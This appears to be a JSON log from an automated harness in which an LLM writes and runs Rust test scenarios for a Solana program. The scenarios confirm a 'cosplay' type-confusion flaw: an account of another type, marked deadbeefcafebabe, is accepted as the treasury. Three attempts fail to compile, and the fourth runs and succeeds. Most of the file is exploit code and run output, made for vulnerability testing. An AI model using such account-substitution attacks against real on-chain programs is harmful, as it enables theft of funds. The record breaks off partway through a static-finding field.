@@ -1,0 +1,175 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: conta de outro tipo foi aceita como treasury (execucao bem-sucedida)",
+  "attempts_used": 4,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2640,
+        "completion_tokens": 840,
+        "latency_s": 4.57
+      },
+      "raw": "{\n  \"plan\": \"O programa `process` (Pinocchio) le a conta `treasury` por offsets fixos (8..40 authority, 40..48 balance, 48 is_active) sem validar discriminador. O baseline usa uma conta de tesouraria legitima com is_active=1 e deve ter sucesso. O ataque substitui a conta `treasury` por uma conta de outro tipo (ex.: uma conta de configuracao com layout compativel nos offsets usados) que tambem tem is_active=1, e o programa a aceita como tesouraria. O efeito medido e que a conta de outro tipo foi aceita como treasury (execucao bem-sucedida), o que o uso legitimo nao faria se houvesse validacao de tipo.\",\n  \"scenario\": \"let treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\\n        d[8..40].copy_from_slice(&[1u8; 32]);\\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet ix_legit = env.raw_ix(&[IX_PROCESS], &[\\n    AccountMeta::new_readonly(treasury_legit_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet contas_legit = vec![\\n    (treasury_legit_key, treasury_legit),\\n    (authority_key, authority),\\n];\\n\\nlet r_base = env.baseline(\\\"uso legitimo: treasury valida com is_active=1\\\", &ix_legit, &contas_legit);\\n\\nlet treasury_cosplay = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\\n        d[8..40].copy_from_slice(&[2u8; 32]);\\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet ix_attack = env.raw_ix(&[IX_PROCESS], &[\\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet contas_attack = vec![\\n    (treasury_cosplay_key, treasury_cosplay),\\n    (authority_key, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como treasury\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    env.effect(\\\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\\\", true);\\n}\"\n}",
+      "plan": "O programa `process` (Pinocchio) le a conta `treasury` por offsets fixos (8..40 authority, 40..48 balance, 48 is_active) sem validar discriminador. O baseline usa uma conta de tesouraria legitima com is_active=1 e deve ter sucesso. O ataque substitui a conta `treasury` por uma conta de outro tipo (ex.: uma conta de configuracao com layout compativel nos offsets usados) que tambem tem is_active=1, e o programa a aceita como tesouraria. O efeito medido e que a conta de outro tipo foi aceita como treasury (execucao bem-sucedida), o que o uso legitimo nao faria se houvesse validacao de tipo.",
+      "scenario": "let treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\n        d[8..40].copy_from_slice(&[1u8; 32]);\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet ix_legit = env.raw_ix(&[IX_PROCESS], &[\n    AccountMeta::new_readonly(treasury_legit_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet contas_legit = vec![\n    (treasury_legit_key, treasury_legit),\n    (authority_key, authority),\n];\n\nlet r_base = env.baseline(\"uso legitimo: treasury valida com is_active=1\", &ix_legit, &contas_legit);\n\nlet treasury_cosplay = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\n        d[8..40].copy_from_slice(&[2u8; 32]);\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet ix_attack = env.raw_ix(&[IX_PROCESS], &[\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet contas_attack = vec![\n    (treasury_cosplay_key, treasury_cosplay),\n    (authority_key, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como treasury\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    env.effect(\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\", true);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_PROCESS` in this scope\n  --> tests/attempt.rs:24:33\n   |\n24 |     let ix_legit = env.raw_ix(&[IX_PROCESS], &[\n   |                                 ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:25:35\n   |\n25 |         AccountMeta::new_readonly(treasury_legit_key, false),\n   |                                   ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n25 -         AccountMeta::new_readonly(treasury_legit_key, false),\n25 +         AccountMeta::new_readonly(treasury_legit, false),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:26:35\n   |\n26 |         AccountMeta::new_readonly(authority_key, false),\n   |                                   ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n26 -         AccountMeta::new_readonly(authority_key, false),\n26 +         AccountMeta::new_readonly(authority, false),\n   |\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (treasury_legit_key, treasury_legit),\n   |          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n30 -         (treasury_legit_key, treasury_legit),\n30 +         (treasury_legit, treasury_legit),",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_PROCESS` in this scope\n  --> tests/attempt.rs:24:33\n   |\n24 |     let ix_legit = env.raw_ix(&[IX_PROCESS], &[\n   |                                 ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:25:35\n   |\n25 |         AccountMeta::new_readonly(treasury_legit_key, false),\n   |                                   ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n25 -         AccountMeta::new_readonly(treasury_legit_key, false),\n25 +         AccountMeta::new_readonly(treasury_legit, false),\n   |\n\nerror[E0425]: cannot find value `authority_key` in this scope\n  --> tests/attempt.rs:26:35\n   |\n26 |         AccountMeta::new_readonly(authority_key, false),\n   |                                   ^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n26 -         AccountMeta::new_readonly(authority_key, false),\n26 +         AccountMeta::new_readonly(authority, false),\n   |\n\nerror[E0425]: cannot find value `treasury_legit_key` in this scope\n  --> tests/attempt.rs:30:10\n   |\n30 |         (treasury_legit_key, treasury_legit),\n   |          ^^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n30 -         (treasury_legit_key, treasury_legit),\n30 +         (treasury_legit, treasury_legit),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3668,
+        "completion_tokens": 815,
+        "latency_s": 3.97
+      },
+      "raw": "{\"plan\": \"Preparo uma conta treasury legitima com discriminador valido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline chama process com a treasury legitima (deve ter sucesso). O ataque chama process com a conta cosplay no lugar da treasury; se o programa aceitar, o efeito registra que uma conta de outro tipo foi tratada como treasury.\", \"scenario\": \"let treasury_legit_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\\n        d[8..40].copy_from_slice(&[1u8; 32]);\\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet ix_legit = env.raw_ix(&[0u8], &[\\n    AccountMeta::new_readonly(treasury_legit_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet contas_legit = vec![\\n    (treasury_legit_key, treasury_legit),\\n    (authority_key, authority),\\n];\\n\\nlet _r_base = env.baseline(\\\"uso legitimo: treasury valida com is_active=1\\\", &ix_legit, &contas_legit);\\n\\nlet treasury_cosplay_key = Pubkey::new_unique();\\nlet treasury_cosplay = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\\n        d[8..40].copy_from_slice(&[2u8; 32]);\\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet ix_attack = env.raw_ix(&[0u8], &[\\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n]);\\n\\nlet contas_attack = vec![\\n    (treasury_cosplay_key, treasury_cosplay),\\n    (authority_key, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como treasury\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    env.effect(\\\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\\\", true);\\n}\"}",
+      "plan": "Preparo uma conta treasury legitima com discriminador valido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline chama process com a treasury legitima (deve ter sucesso). O ataque chama process com a conta cosplay no lugar da treasury; se o programa aceitar, o efeito registra que uma conta de outro tipo foi tratada como treasury.",
+      "scenario": "let treasury_legit_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\n        d[8..40].copy_from_slice(&[1u8; 32]);\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet ix_legit = env.raw_ix(&[0u8], &[\n    AccountMeta::new_readonly(treasury_legit_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet contas_legit = vec![\n    (treasury_legit_key, treasury_legit),\n    (authority_key, authority),\n];\n\nlet _r_base = env.baseline(\"uso legitimo: treasury valida com is_active=1\", &ix_legit, &contas_legit);\n\nlet treasury_cosplay_key = Pubkey::new_unique();\nlet treasury_cosplay = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\n        d[8..40].copy_from_slice(&[2u8; 32]);\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet ix_attack = env.raw_ix(&[0u8], &[\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n]);\n\nlet contas_attack = vec![\n    (treasury_cosplay_key, treasury_cosplay),\n    (authority_key, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como treasury\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    env.effect(\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\", true);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:27:39\n    |\n 27 |       let ix_legit = env.raw_ix(&[0u8], &[\n    |  ________________________------_________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 28 | |         AccountMeta::new_readonly(treasury_legit_key, false),\n 29 | |         AccountMeta::new_readonly(authority_key, false),\n 30 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:53:40\n    |\n 53 |       let ix_attack = env.raw_ix(&[0u8], &[\n    |  _________________________------_________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 54 | |         AccountMeta::new_readonly(treasury_cosplay_key, false),\n 55 | |         AccountMeta::new_readonly(authority_key, false),\n 56 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:27:39\n    |\n 27 |       let ix_legit = env.raw_ix(&[0u8], &[\n    |  ________________________------_________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 28 | |         AccountMeta::new_readonly(treasury_legit_key, false),\n 29 | |         AccountMeta::new_readonly(authority_key, false),\n 30 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:53:40\n    |\n 53 |       let ix_attack = env.raw_ix(&[0u8], &[\n    |  _________________________------_________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 54 | |         AccountMeta::new_readonly(treasury_cosplay_key, false),\n 55 | |         AccountMeta::new_readonly(authority_key, false),\n 56 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3621,
+        "completion_tokens": 869,
+        "latency_s": 4.07
+      },
+      "raw": "{\"plan\": \"Montar uma conta treasury legitima com discriminador conhecido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline usa a treasury legitima e deve ter sucesso. O ataque substitui a treasury pela conta cosplay; se o programa aceitar, o efeito registra que a conta de outro tipo foi tratada como treasury. Corrigir o erro de compilacao passando Vec<AccountMeta> em vez de array.\", \"scenario\": \"let treasury_legit_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\\n        d[8..40].copy_from_slice(&[1u8; 32]);\\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet metas_legit: Vec<AccountMeta> = vec![\\n    AccountMeta::new_readonly(treasury_legit_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_legit = env.raw_ix(&[0u8], &metas_legit);\\n\\nlet contas_legit = vec![\\n    (treasury_legit_key, treasury_legit),\\n    (authority_key, authority),\\n];\\n\\nlet _r_base = env.baseline(\\\"uso legitimo: treasury valida com is_active=1\\\", &ix_legit, &contas_legit);\\n\\nlet treasury_cosplay_key = Pubkey::new_unique();\\nlet treasury_cosplay = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\\n        d[8..40].copy_from_slice(&[2u8; 32]);\\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet metas_attack: Vec<AccountMeta> = vec![\\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_attack = env.raw_ix(&[0u8], &metas_attack);\\n\\nlet contas_attack = vec![\\n    (treasury_cosplay_key, treasury_cosplay),\\n    (authority_key, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como treasury\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    env.effect(\\\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\\\", true);\\n}\"}",
+      "plan": "Montar uma conta treasury legitima com discriminador conhecido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline usa a treasury legitima e deve ter sucesso. O ataque substitui a treasury pela conta cosplay; se o programa aceitar, o efeito registra que a conta de outro tipo foi tratada como treasury. Corrigir o erro de compilacao passando Vec<AccountMeta> em vez de array.",
+      "scenario": "let treasury_legit_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\n        d[8..40].copy_from_slice(&[1u8; 32]);\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet metas_legit: Vec<AccountMeta> = vec![\n    AccountMeta::new_readonly(treasury_legit_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_legit = env.raw_ix(&[0u8], &metas_legit);\n\nlet contas_legit = vec![\n    (treasury_legit_key, treasury_legit),\n    (authority_key, authority),\n];\n\nlet _r_base = env.baseline(\"uso legitimo: treasury valida com is_active=1\", &ix_legit, &contas_legit);\n\nlet treasury_cosplay_key = Pubkey::new_unique();\nlet treasury_cosplay = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\n        d[8..40].copy_from_slice(&[2u8; 32]);\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet metas_attack: Vec<AccountMeta> = vec![\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_attack = env.raw_ix(&[0u8], &metas_attack);\n\nlet contas_attack = vec![\n    (treasury_cosplay_key, treasury_cosplay),\n    (authority_key, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como treasury\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    env.effect(\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\", true);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:31:39\n    |\n 31 |     let ix_legit = env.raw_ix(&[0u8], &metas_legit);\n    |                        ------         ^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                        |\n    |                        arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:58:40\n    |\n 58 |     let ix_attack = env.raw_ix(&[0u8], &metas_attack);\n    |                         ------         ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:31:39\n    |\n 31 |     let ix_legit = env.raw_ix(&[0u8], &metas_legit);\n    |                        ------         ^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                        |\n    |                        arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:58:40\n    |\n 58 |     let ix_attack = env.raw_ix(&[0u8], &metas_attack);\n    |                         ------         ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3631,
+        "completion_tokens": 863,
+        "latency_s": 3.72
+      },
+      "raw": "{\"plan\": \"Montar uma conta treasury legitima com discriminador conhecido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline usa a treasury legitima e deve ter sucesso. O ataque substitui a treasury pela conta cosplay; se o programa aceitar (Success), confirma que nao valida discriminador de tipo. O efeito mede que a execucao foi bem-sucedida com uma conta de outro tipo.\", \"scenario\": \"let treasury_legit_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet treasury_legit = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\\n        d[8..40].copy_from_slice(&[1u8; 32]);\\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet metas_legit: Vec<AccountMeta> = vec![\\n    AccountMeta::new_readonly(treasury_legit_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_legit = env.raw_ix(&[0u8], metas_legit);\\n\\nlet contas_legit = vec![\\n    (treasury_legit_key, treasury_legit),\\n    (authority_key, authority),\\n];\\n\\nlet _r_base = env.baseline(\\\"uso legitimo: treasury valida com is_active=1\\\", &ix_legit, &contas_legit);\\n\\nlet treasury_cosplay_key = Pubkey::new_unique();\\nlet treasury_cosplay = account(\\n    &env.program_id,\\n    &{\\n        let mut d = vec![0u8; 49];\\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\\n        d[8..40].copy_from_slice(&[2u8; 32]);\\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\\n        d[48] = 1;\\n        d\\n    },\\n    None,\\n);\\n\\nlet metas_attack: Vec<AccountMeta> = vec![\\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_attack = env.raw_ix(&[0u8], metas_attack);\\n\\nlet contas_attack = vec![\\n    (treasury_cosplay_key, treasury_cosplay),\\n    (authority_key, wallet(1_000_000_000)),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como treasury\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    env.effect(\\\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\\\", true);\\n}\"}",
+      "plan": "Montar uma conta treasury legitima com discriminador conhecido e is_active=1, e uma conta cosplay com discriminador diferente mas layout compativel nos offsets 8..40, 40..48 e 48. O baseline usa a treasury legitima e deve ter sucesso. O ataque substitui a treasury pela conta cosplay; se o programa aceitar (Success), confirma que nao valida discriminador de tipo. O efeito mede que a execucao foi bem-sucedida com uma conta de outro tipo.",
+      "scenario": "let treasury_legit_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet treasury_legit = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0x6d, 0x8d, 0xa3, 0x9c, 0x42, 0x7f, 0x1b, 0x2a]);\n        d[8..40].copy_from_slice(&[1u8; 32]);\n        d[40..48].copy_from_slice(&1000u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet authority = wallet(1_000_000_000);\n\nlet metas_legit: Vec<AccountMeta> = vec![\n    AccountMeta::new_readonly(treasury_legit_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_legit = env.raw_ix(&[0u8], metas_legit);\n\nlet contas_legit = vec![\n    (treasury_legit_key, treasury_legit),\n    (authority_key, authority),\n];\n\nlet _r_base = env.baseline(\"uso legitimo: treasury valida com is_active=1\", &ix_legit, &contas_legit);\n\nlet treasury_cosplay_key = Pubkey::new_unique();\nlet treasury_cosplay = account(\n    &env.program_id,\n    &{\n        let mut d = vec![0u8; 49];\n        d[0..8].copy_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe]);\n        d[8..40].copy_from_slice(&[2u8; 32]);\n        d[40..48].copy_from_slice(&9999u64.to_le_bytes());\n        d[48] = 1;\n        d\n    },\n    None,\n);\n\nlet metas_attack: Vec<AccountMeta> = vec![\n    AccountMeta::new_readonly(treasury_cosplay_key, false),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_attack = env.raw_ix(&[0u8], metas_attack);\n\nlet contas_attack = vec![\n    (treasury_cosplay_key, treasury_cosplay),\n    (authority_key, wallet(1_000_000_000)),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como treasury\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    env.effect(\"conta de outro tipo foi aceita como treasury (execucao bem-sucedida)\", true);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "uso legitimo: treasury valida com is_active=1",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-r,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "6d8da39c427f1b2a",
+                "digest": "d0346e95bfce1612",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como treasury",
+            "result": "Success",
+            "compute_units": 395,
+            "account_flags": "-r,-r",
+            "ix_head": "00",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": false,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "deadbeefcafebabe",
+                "digest": "f944a62aac7f7e5d",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "conta de outro tipo foi aceita como treasury (execucao bem-sucedida)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 395 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: conta de outro tipo foi aceita como treasury (execucao bem-sucedida)"
+    }
+  ],
+  "case_id": "SSP-02-P-V",
+  "static_finding": {
